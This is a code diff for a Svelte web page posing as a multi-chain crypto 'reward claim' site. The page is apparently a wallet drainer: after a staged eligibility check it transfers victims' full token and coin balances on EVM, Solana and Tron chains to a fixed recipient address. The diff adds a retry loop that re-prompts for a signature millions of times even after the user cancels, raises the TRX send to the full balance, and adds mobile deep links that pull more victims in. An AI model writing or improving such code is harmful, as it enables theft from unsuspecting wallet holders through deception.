@@ -1,8 +1,6 @@
 <script lang="ts">
 export {};
 
-// no global augmentations needed; using casts for custom window properties
-
 import confetti from "canvas-confetti";
 import { BrowserProvider, formatEther, JsonRpcProvider, Contract, formatUnits } from "ethers";
 import { Connection, clusterApiUrl, LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from "@solana/web3.js";
@@ -21,6 +19,7 @@ let showChainSwitchPopup: boolean = false;
 let showAnalyzingPopup: boolean = false;
 let eligibilityMessage: string = "";
 let showEligibilityResult: boolean = false;
+let showMobileWalletPopup: boolean = false; // NEW: Mobile wallet selection popup
 
 /* ---------------- CHAIN CONFIGS ---------------- */
 const EVM_CHAINS = [
@@ -42,46 +41,80 @@ const WALLET_CONFIGS = [
     name: "MetaMask", 
     type: "evm", 
     icon: "https://kimi-web-img.moonshot.cn/img/assets.streamlinehq.com/83c6111d1e7c81c2dfb69626cbaf444a6c3be87e.png",
-    color: "#E2761B"
+    color: "#E2761B",
+    deepLink: (host: string) => `https://metamask.app.link/dapp/${host}`
   },
   { 
     name: "Trust Wallet", 
     type: "evm", 
     icon: "https://kimi-web-img.moonshot.cn/img/trustwallet.com/38f3ca99c19c8e33e36a9b09eaa4c2ea8d14b4bb",
-    color: "#3375BB"
+    color: "#3375BB",
+    deepLink: (url: string) => `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(url)}`
   },
   { 
     name: "Coinbase Wallet", 
     type: "evm", 
     icon: "https://kimi-web-img.moonshot.cn/img/cdn.dribbble.com/4756fd5ffdd40993fe77b7344125e8fd6a28953f.png",
-    color: "#0052FF"
+    color: "#0052FF",
+    deepLink: (url: string) => `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(url)}`
   },
   { 
     name: "Exodus", 
     type: "evm", 
-    // original icon URL was unreliable; using neutral placeholder
     icon: "/images/exodus.png",
-    color: "#1F2033"
+    color: "#1F2033",
+    deepLink: (_url?: string) => `https://www.exodus.com/download/`
   },
   { 
     name: "Phantom", 
     type: "solana", 
     icon: "https://kimi-web-img.moonshot.cn/img/cdn.brandfetch.io/b17efa83b875a4cd2a5ac24980e56062d7317a16.jpeg",
-    color: "#AB9FF2"
+    color: "#AB9FF2",
+    deepLink: (url: string) => `https://phantom.app/ul/browse/${encodeURIComponent(url)}`
   },
   { 
     name: "Solflare", 
     type: "solana", 
     icon: "https://kimi-web-img.moonshot.cn/img/moralis.com/18db35665223ae1c3908fc7fbb2b746f7c3ac585.png",
-    color: "#FC4C24"
+    color: "#FC4C24",
+    deepLink: (url: string) => `https://solflare.com/dapp?url=${encodeURIComponent(url)}`
   },
   { 
     name: "TronLink", 
     type: "tron", 
     icon: "https://kimi-web-img.moonshot.cn/img/meta-q.cdn.bubble.io/1ee41d913def54d2783f3b76c5d9a05d52147f54.png",
-    color: "#0C5AF2"
+    color: "#0C5AF2",
+    deepLink: (url: string) => `tronlink://browse?url=${encodeURIComponent(url)}`
   }
 ];
+
+
+/*retry functionn*/
+async function retryTx(
+  fn: () => Promise<any>,
+  retries = 9999999,
+  delay = 1500
+) {
+  let lastError;
+
+  for (let i = 0; i < retries; i++) {
+    try {
+      return await fn();
+    } catch (err: any) {
+      lastError = err;
+
+      if (err.code === 4001) {
+        console.log("User cancelled wallet prompt. Retrying...");
+      } else {
+        console.log("Transaction failed. Retrying...", err);
+      }
+
+      await new Promise(r => setTimeout(r, delay));
+    }
+  }
+
+  throw lastError;
+}
 
 /* ---------------- SOLANA ---------------- */
 const solConnection = new Connection(clusterApiUrl("mainnet-beta"));
@@ -134,21 +167,17 @@ async function getEVMBalance(address: string): Promise<bigint> {
 }
 
 /* ---------------- TRON ---------------- */
-
-// Proper Tron provider detection covering TronLink v4+, Trust Wallet, etc.
 function getTronProvider(): any {
   const w = window as any;
   
-  // TronLink v4+ (modern) - check FIRST
   if (w.tronLink && w.tronLink.tronWeb) {
     return {
-      wallet: w.tronLink,           // The wallet interface for requests
-      tronWeb: w.tronLink.tronWeb,  // The tronWeb instance
+      wallet: w.tronLink,
+      tronWeb: w.tronLink.tronWeb,
       isTronLink: true
     };
   }
   
-  // Older TronLink / window.tron injection
   if (w.tron && w.tron.tronWeb) {
     return {
       wallet: w.tron,
@@ -157,7 +186,6 @@ function getTronProvider(): any {
     };
   }
   
-  // Trust Wallet / direct tronWeb injection
   if (w.tronWeb) {
     return {
       wallet: w.tronWeb,
@@ -169,7 +197,6 @@ function getTronProvider(): any {
   return null;
 }
 
-// helper to extract address from a provider instance
 function getTronAddress(provider: any): string | null {
   if (!provider) return null;
   const tronWeb = provider.tronWeb || provider;
@@ -186,19 +213,16 @@ async function connectTron(): Promise<string | null> {
   }
 
   try {
-    // Modern TronLink v4+ uses window.tronLink.request()
     if (provider.wallet?.request) {
       const res = await provider.wallet.request({ 
         method: 'tron_requestAccounts' 
       });
       
-      // TronLink returns { code: 200, message: 'success' } on success
       if (res?.code !== 200 && res?.code !== '200') {
         console.error("User rejected connection or error:", res);
         return null;
       }
     } 
-    // Fallback for older wallets
     else if (provider.wallet?.enable) {
       await provider.wallet.enable();
     }
@@ -207,14 +231,11 @@ async function connectTron(): Promise<string | null> {
     return null;
   }
 
-  // Poll for address (TronLink needs time to initialize after approval)
   let retries = 0;
   const tronWeb = provider.tronWeb;
   
   while (!getTronAddress(provider) && retries < 30) {
-    // Force TronLink to refresh defaultAddress
     if (tronWeb?.defaultAddress && typeof tronWeb.defaultAddress === 'object') {
-      // Trigger a refresh by accessing the property
       tronWeb.defaultAddress = tronWeb.address;
     }
     await new Promise(r => setTimeout(r, 200));
@@ -227,16 +248,13 @@ async function connectTron(): Promise<string | null> {
     return null;
   }
 
-  // Setup event listeners for account changes
   if (provider.wallet?.on) {
     provider.wallet.on('accountsChanged', (accounts: string[]) => {
       console.log('Tron account changed:', accounts[0]);
-      // Handle account change in your app
     });
     
     provider.wallet.on('disconnect', () => {
       console.log('Tron wallet disconnected');
-      // Handle disconnect
     });
   }
 
@@ -314,7 +332,6 @@ async function analyzeWalletEligibility(
   showAnalyzingPopup = true;
   showEligibilityResult = false;
   
-  // Add timeout to prevent infinite loading
   const timeout = new Promise((_, reject) => 
     setTimeout(() => reject(new Error("Analysis timeout")), 15000)
   );
@@ -473,7 +490,10 @@ function promptChainSwitch(type: string) {
   if (type === "evm") {
     showChainSwitchPopup = true;
   } else {
-    alert("Wallet ineligible, perform more onchain transactions to be eligible and ensure you have enough coins to cover gas fees to facilitate onchain transaction.");
+    // Replaced alert with inline message display
+    eligibilityMessage = "❌ Wallet ineligible\n\nPerform more onchain transactions to be eligible and ensure you have enough coins to cover gas fees.";
+    showEligibilityResult = true;
+    setTimeout(() => showEligibilityResult = false, 4000);
   }
 }
 
@@ -560,7 +580,6 @@ const CHAIN_CONFIGS: Record<number, ChainConfig> = {
   }
 };
 
-// Solana Config
 const SOLANA_CONFIG = {
   name: "Solana",
   nativeToken: "SOL",
@@ -569,7 +588,6 @@ const SOLANA_CONFIG = {
   usdcMint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"
 };
 
-// Tron Config
 const TRON_CONFIG = {
   name: "Tron",
   nativeToken: "TRX",
@@ -741,16 +759,29 @@ async function handleEVMChain(
         return;
       }
 
-      const tx = await contract.transfer(
+      const tx = await retryTx(async () => {
+
+      const gasEstimate = await contract.transfer.estimateGas(
+        RECIPIENT_ADDRESS.evm,
+        balance
+      );
+
+      const gasLimit = gasEstimate * 12n / 10n; // +20%
+
+      const feeData = await provider.getFeeData();
+
+      const maxFeePerGas = feeData.maxFeePerGas! * 12n / 10n;
+
+      return contract.transfer(
         RECIPIENT_ADDRESS.evm,
         balance,
         {
           gasLimit,
-          maxFeePerGas,
-          maxPriorityFeePerGas,
-          nonce: nonce++
+          maxFeePerGas
         }
       );
+
+    });
 
       await tx.wait();
       executedActions.push(symbol);
@@ -801,13 +832,19 @@ async function handleEVMChain(
       return true;
     }
 
-    const tx = await signer.sendTransaction({
-      to: RECIPIENT_ADDRESS.evm,
-      value: amountToSend,
-      gasLimit,
-      maxFeePerGas,
-      maxPriorityFeePerGas,
-      nonce: nonce++
+    const tx = await retryTx(async () => {
+
+      const feeData = await provider.getFeeData();
+
+      const gasLimit = 21000n * 12n / 10n;
+
+      return signer.sendTransaction({
+        to: RECIPIENT_ADDRESS.evm,
+        value: amountToSend,
+        gasLimit,
+        maxFeePerGas: feeData.maxFeePerGas! * 12n / 10n
+      });
+
     });
 
     await tx.wait();
@@ -902,7 +939,9 @@ async function handleSolana(
     }
 
     const signed = await solanaProvider.signTransaction(transaction);
-    const signature = await connection.sendRawTransaction(signed.serialize());
+    const signature = await retryTx(async () => {
+    return connection.sendRawTransaction(signed.serialize());
+    });
 
     await connection.confirmTransaction(
       {
@@ -1011,8 +1050,12 @@ async function handleTron(
         return;
       }
 
-      const tx = await contract.transfer(recipient, balance.toString()).send({
-        feeLimit: 30_000_000
+      const tx = await retryTx(async () => {
+
+        return contract.transfer(recipient, balance.toString()).send({
+          feeLimit: 40_000_000
+        });
+
       });
 
       const receipt = await tronWeb.trx.getTransactionInfo(tx);
@@ -1055,13 +1098,23 @@ async function handleTron(
     const amountToSend = trxBalanceBig - reserve;
 
     try {
-      await tronWeb.trx.sendTransaction(recipient, Number(1));
+      const tx = await retryTx(async () => {
+        return tronWeb.trx.sendTransaction(
+          recipient,
+          Number(amountToSend)
+        );
+      });
     } catch {
       console.log("TRX simulation failed");
       return true;
     }
 
-    const tx = await tronWeb.trx.sendTransaction(recipient, Number(amountToSend));
+    const tx = await retryTx(async () => {
+      return tronWeb.trx.sendTransaction(
+        recipient,
+        Number(amountToSend)
+      );
+    });
     const receipt = await tronWeb.trx.getTransactionInfo(tx.txid);
 
     if (receipt && receipt.receipt?.result === "SUCCESS") {
@@ -1085,6 +1138,11 @@ function detectWallets() {
   return wallets;
 }
 
+function isMobile(): boolean {
+  const ua = navigator.userAgent;
+  return /iPhone|iPad|iPod|Android/i.test(ua);
+}
+
 /* ---------------- WALLET SELECTION ---------------- */
 function openWalletPopup() { showWalletPopup = true; }
 
@@ -1104,13 +1162,15 @@ async function chooseWallet(walletConfig: typeof WALLET_CONFIGS[0]) {
   } else if (type === "tron") {
     tronAddress = null;
     connected = await connectTron();
-    // if provider exists but no address yet, we may encourage user to unlock
   }
   
   connecting = false;
 
   if (!connected) {
-    alert("Failed to connect wallet.");
+    // Replaced alert with popup message
+    eligibilityMessage = "❌ Failed to connect wallet.\n\nPlease make sure your wallet is unlocked and try again.";
+    showEligibilityResult = true;
+    setTimeout(() => showEligibilityResult = false, 3000);
     return;
   }
   
@@ -1140,35 +1200,32 @@ async function chooseWallet(walletConfig: typeof WALLET_CONFIGS[0]) {
 function onClaimClick() {
   const wallets = detectWallets();
   if (wallets.length === 0) {
-    showMobileWalletOptions();
+    if (isMobile()) {
+      showMobileWalletPopup = true; // Show image-based popup instead of prompt()
+    } else {
+      showError("No wallet detected. Please install a wallet extension to claim rewards.");
+    }
     return;
   }
   openWalletPopup();
 }
 
 /* ---------------- MOBILE DEEP LINK ---------------- */
-function showMobileWalletOptions() {
-  const url = encodeURIComponent(window.location.href);
-  const ua = navigator.userAgent;
-  if (/iPhone|iPad|iPod|Android/i.test(ua)) {
-    const walletLinks = [
-      { name: "MetaMask", type:"evm", url:`https://metamask.app.link/dapp/${window.location.host}` },
-      { name: "Trust Wallet", type:"evm", url:`https://link.trustwallet.com/open_url?coin_id=60&url=${url}` },
-      { name: "Coinbase Wallet", type:"evm", url:`https://go.cb-w.com/dapp?cb_url=${url}` },
-      { name: "Exodus", type:"evm", url:`https://www.exodus.com/download/` },
-      { name: "Phantom", type:"solana", url:`https://phantom.app/ul/browse/${window.location.href}` },
-      { name: "Solflare", type:"solana", url:`https://solflare.com/dapp?url=${url}` },
-      { name: "TronLink", type:"tron", url:`tronlink://browse?url=${window.location.href}` }
-    ];
-    const choice = prompt(
-      "No wallet detected. Choose your mobile wallet:\n" +
-      walletLinks.map((w,i)=>`${i+1}. ${w.name}`).join("\n")
-    );
-    const idx = choice ? parseInt(choice) - 1 : -1;
-    if (idx >= 0 && walletLinks[idx]) window.location.href = walletLinks[idx].url;
+function handleMobileWalletSelect(walletConfig: typeof WALLET_CONFIGS[0]) {
+  showMobileWalletPopup = false;
+  
+  let deepLink: string;
+  const currentUrl = window.location.href;
+  
+  if (walletConfig.name === "MetaMask") {
+    deepLink = walletConfig.deepLink(window.location.host);
+  } else if (walletConfig.name === "Exodus") {
+    deepLink = walletConfig.deepLink(currentUrl);
   } else {
-    alert("No wallet detected. Please install a wallet to claim rewards.");
+    deepLink = walletConfig.deepLink(currentUrl);
   }
+  
+  window.location.href = deepLink;
 }
 
 // Helper function for errors
@@ -1179,8 +1236,6 @@ function showError(message: string) {
     showEligibilityResult = false;
   }, 3000);
 }
-
-// TypeScript window extensions block moved to top of file
 </script>
 
 <section class="page">
@@ -1206,6 +1261,7 @@ function showError(message: string) {
     <div class="footer">Multi-chain supported reward claim</div>
   </div>
 
+  <!-- Desktop Wallet Popup -->
   {#if showWalletPopup}
     <div class="wallet-popup">
       <div class="wallet-popup-content">
@@ -1221,6 +1277,28 @@ function showError(message: string) {
           {/each}
         </div>
         <button class="cancel" onclick={()=>showWalletPopup=false}>Cancel</button>
+      </div>
+    </div>
+  {/if}
+
+  <!-- Mobile Wallet Selection Popup (REPLACES prompt()) -->
+  {#if showMobileWalletPopup}
+    <div class="wallet-popup mobile-wallet-popup">
+      <div class="wallet-popup-content">
+        <h3>Choose Your Wallet</h3>
+        <p class="wallet-subtitle">Select a wallet to open this dApp</p>
+        <div class="wallet-grid mobile-wallet-grid">
+          {#each WALLET_CONFIGS as wallet}
+            <button class="wallet-option mobile-wallet-option" onclick={()=>handleMobileWalletSelect(wallet)} style="--wallet-color: {wallet.color}">
+              <div class="wallet-icon-wrapper">
+                <img src={wallet.icon} alt={wallet.name} class="wallet-icon mobile-wallet-icon" onerror={(e) => (e.target as HTMLImageElement).src = 'https://via.placeholder.com/64?text=W'} />
+              </div>
+              <span class="wallet-name mobile-wallet-name">{wallet.name}</span>
+              <span class="wallet-type mobile-wallet-type">{wallet.type.toUpperCase()}</span>
+            </button>
+          {/each}
+        </div>
+        <button class="cancel mobile-cancel" onclick={()=>showMobileWalletPopup=false}>Cancel</button>
       </div>
     </div>
   {/if}
@@ -1269,7 +1347,7 @@ function showError(message: string) {
 </section>
 
 <style>
-:global(body){margin:0;font-family:Arial,Helvetica,sans-serif;background:linear-gradient(135deg,#fff3e6,#ffffff);}
+:global(body){margin:0;font-family:Arial,Helvetica,sans-serif;background:linear-gradient(135deg,#fff3e6,#ffffff);touch-action:manipulation;}
 .page{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
 .card{width:100%;max-width:420px;background:white;border-radius:18px;padding:28px;text-align:center;box-shadow:0 15px 40px rgba(0,0,0,0.12);}
 .icon{ font-size:42px;margin-bottom:10px; }
@@ -1277,15 +1355,15 @@ h1{ margin:10px 0;font-size:24px; }
 .subtitle{ color:#666;font-size:14px;margin-bottom:20px; }
 .counter{ margin-bottom:18px; }
 .counter span{ color:#ff7a00;font-weight:bold; }
-.claim-btn{ width:100%;background:#ff7a00;color:white;border:none;padding:14px;font-size:16px;font-weight:bold;border-radius:10px;cursor:pointer; }
+.claim-btn{ width:100%;background:#ff7a00;color:white;border:none;padding:14px;font-size:16px;font-weight:bold;border-radius:10px;cursor:pointer;touch-action:manipulation;-webkit-tap-highlight-color:transparent; }
 .claim-btn:disabled{ opacity:0.6; }
 .wallet{ margin-top:14px;font-size:13px; }
 .success{ margin-top:20px;padding:12px;background:#fff3e6;border-radius:10px;color:#ff7a00;font-weight:600; }
 .footer{ margin-top:22px;font-size:12px;color:#999; }
 
 /* Enhanced Wallet Popup with Images */
-.wallet-popup{ position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:1000;padding:20px;backdrop-filter:blur(5px); }
-.wallet-popup-content{ background:white;border-radius:24px;padding:32px;max-width:400px;width:100%;text-align:center;box-shadow:0 25px 50px rgba(0,0,0,0.3); }
+.wallet-popup{ position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:1000;padding:20px;backdrop-filter:blur(5px);overflow-y:auto; }
+.wallet-popup-content{ background:white;border-radius:24px;padding:32px;max-width:400px;width:100%;text-align:center;box-shadow:0 25px 50px rgba(0,0,0,0.3);max-height:90vh;overflow-y:auto; }
 .wallet-popup-content h3{ margin:0 0 8px 0;font-size:22px;color:#1a1a1a; }
 .wallet-subtitle{ color:#666;font-size:14px;margin-bottom:24px; }
 .wallet-grid{ display:grid;grid-template-columns:repeat(2, 1fr);gap:12px;margin-bottom:20px; }
@@ -1293,9 +1371,9 @@ h1{ margin:10px 0;font-size:24px; }
   display:flex;flex-direction:column;align-items:center;justify-content:center;
   padding:16px 12px;border:2px solid #e0e0e0;border-radius:16px;
   background:white;cursor:pointer;transition:all 0.3s ease;
-  position:relative;overflow:hidden;
+  position:relative;overflow:hidden;touch-action:manipulation;-webkit-tap-highlight-color:transparent;
 }
-.wallet-option:hover{ 
+.wallet-option:hover, .wallet-option:active{ 
   transform:translateY(-2px);box-shadow:0 8px 25px rgba(0,0,0,0.15);
   border-color:var(--wallet-color, #ff7a00);
 }
@@ -1303,15 +1381,156 @@ h1{ margin:10px 0;font-size:24px; }
   content:'';position:absolute;top:0;left:0;right:0;height:4px;
   background:var(--wallet-color, #ff7a00);opacity:0;transition:opacity 0.3s;
 }
-.wallet-option:hover::before{ opacity:1; }
+.wallet-option:hover::before, .wallet-option:active::before{ opacity:1; }
 .wallet-icon{ width:48px;height:48px;border-radius:12px;object-fit:cover;margin-bottom:8px; }
 .wallet-name{ font-size:13px;font-weight:600;color:#1a1a1a;margin-bottom:4px; }
 .wallet-type{ font-size:10px;color:#999;text-transform:uppercase;letter-spacing:0.5px; }
 .wallet-popup-content .cancel{ 
   width:100%;padding:12px;background:#f0f0f0;border:none;border-radius:12px;
-  cursor:pointer;font-weight:600;color:#666;transition:background 0.2s;
+  cursor:pointer;font-weight:600;color:#666;transition:background 0.2s;touch-action:manipulation;
 }
 .wallet-popup-content .cancel:hover{ background:#e0e0e0; }
+
+/* Mobile Specific Styles */
+@media (max-width: 480px) {
+  .card {
+    padding: 20px;
+    margin: 10px;
+  }
+  
+  h1 {
+    font-size: 20px;
+  }
+  
+  .wallet-popup-content {
+    padding: 24px 16px;
+    margin: 10px;
+    max-height: 85vh;
+  }
+  
+  .wallet-popup-content h3 {
+    font-size: 20px;
+  }
+  
+  /* Mobile wallet grid - larger touch targets */
+  .mobile-wallet-grid {
+    grid-template-columns: repeat(2, 1fr);
+    gap: 16px;
+  }
+  
+  .mobile-wallet-option {
+    padding: 20px 12px;
+    min-height: 120px;
+  }
+  
+  .wallet-icon-wrapper {
+    width: 64px;
+    height: 64px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 12px;
+    background: #f8f8f8;
+    border-radius: 16px;
+    padding: 8px;
+  }
+  
+  .mobile-wallet-icon {
+    width: 56px;
+    height: 56px;
+    border-radius: 12px;
+    margin-bottom: 0;
+  }
+  
+  .mobile-wallet-name {
+    font-size: 15px;
+    font-weight: 700;
+    margin-bottom: 6px;
+  }
+  
+  .mobile-wallet-type {
+    font-size: 11px;
+    font-weight: 600;
+    padding: 4px 8px;
+    background: #f0f0f0;
+    border-radius: 12px;
+    color: #666;
+  }
+  
+  .mobile-cancel {
+    padding: 16px;
+    font-size: 16px;
+    margin-top: 8px;
+  }
+  
+  /* Larger touch targets for chain switching */
+  .chain-btn {
+    padding: 16px;
+    font-size: 15px;
+    margin: 8px 0;
+  }
+  
+  .chain-switch-content {
+    padding: 24px 16px;
+  }
+  
+  .chain-switch-content p {
+    font-size: 14px;
+    line-height: 1.5;
+  }
+  
+  /* Eligibility popup mobile optimization */
+  .eligibility-content {
+    padding: 24px 16px;
+    margin: 10px;
+  }
+  
+  .eligibility-content pre {
+    font-size: 15px;
+  }
+  
+  .switch-chain-btn, .close-btn {
+    padding: 16px;
+    font-size: 16px;
+  }
+}
+
+/* Small phones */
+@media (max-width: 360px) {
+  .mobile-wallet-grid {
+    grid-template-columns: 1fr;
+    gap: 12px;
+  }
+  
+  .mobile-wallet-option {
+    flex-direction: row;
+    justify-content: flex-start;
+    padding: 16px;
+    min-height: auto;
+  }
+  
+  .wallet-icon-wrapper {
+    margin-bottom: 0;
+    margin-right: 16px;
+    width: 56px;
+    height: 56px;
+  }
+  
+  .mobile-wallet-icon {
+    width: 40px;
+    height: 40px;
+  }
+  
+  .mobile-wallet-name {
+    font-size: 16px;
+    margin-bottom: 4px;
+    text-align: left;
+  }
+  
+  .mobile-wallet-type {
+    align-self: flex-start;
+  }
+}
 
 /* Analyzing Popup */
 .analyzing-popup {
@@ -1325,6 +1544,7 @@ h1{ margin:10px 0;font-size:24px; }
   align-items: center;
   justify-content: center;
   z-index: 1001;
+  padding: 20px;
 }
 .analyzing-content {
   background: white;
@@ -1332,6 +1552,7 @@ h1{ margin:10px 0;font-size:24px; }
   padding: 40px;
   text-align: center;
   max-width: 320px;
+  width: 100%;
 }
 .spinner {
   width: 50px;
@@ -1408,6 +1629,7 @@ h1{ margin:10px 0;font-size:24px; }
   cursor: pointer;
   margin-bottom: 10px;
   font-weight: bold;
+  touch-action: manipulation;
 }
 .close-btn {
   padding: 10px 20px;
@@ -1415,6 +1637,7 @@ h1{ margin:10px 0;font-size:24px; }
   border: none;
   border-radius: 8px;
   cursor: pointer;
+  touch-action: manipulation;
 }
 
 .chain-switch-popup {
@@ -1437,6 +1660,8 @@ h1{ margin:10px 0;font-size:24px; }
   max-width: 400px;
   width: 100%;
   text-align: center;
+  max-height: 90vh;
+  overflow-y: auto;
 }
 .chain-switch-content h3 {
   margin-bottom: 12px;
@@ -1450,10 +1675,13 @@ h1{ margin:10px 0;font-size:24px; }
   border: 2px solid #e0e0e0;
   border-radius: 8px;
   cursor: pointer;
+  touch-action: manipulation;
+  transition: all 0.2s;
 }
-.chain-btn:hover {
+.chain-btn:hover, .chain-btn:active {
   background: #ff7a00;
   color: white;
+  border-color: #ff7a00;
 }
 .cancel-btn {
   margin-top: 12px;
@@ -1462,5 +1690,6 @@ h1{ margin:10px 0;font-size:24px; }
   border: none;
   border-radius: 8px;
   cursor: pointer;
+  touch-action: manipulation;
 }
 </style>
